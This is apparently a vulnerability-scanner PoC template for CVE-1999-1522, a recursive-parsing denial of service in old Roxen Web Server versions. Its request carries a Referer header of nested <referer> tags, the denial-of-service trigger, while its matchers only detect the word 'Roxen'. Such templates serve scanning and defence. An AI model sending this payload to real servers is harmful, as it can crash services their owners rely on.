[info]
author = "AVE"
description = "检测 Roxen Web Server 1.3.11 及更早版本中 htmlparse.pike 模块递归解析导致的拒绝服务漏洞。RXML 解析器递归处理 <referer> 标签时未对客户端输入的 Referer HTTP 头进行正确引用或阻止递归解析，发送包含递归 RXML 标签的 Referer 头可触发无限递归，耗尽服务器资源。参考 Bugtraq 公告 http://marc.info/?l=bugtraq&m=93942579008408&w=2"
id = "POC-AVE-1999-1158"
name = "Roxen Web Server htmlparse.pike Recursive Parsing DoS PoC"
severity = "medium"
tags = [
    "cve-1999-1522",
    "roxen",
    "rxml",
    "dos",
]
vuln_id = [
    "CVE-1999-1522",
    "AVE-1999-1158",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Referer = "<referer><referer><referer><referer>"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["Roxen"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Roxen"]
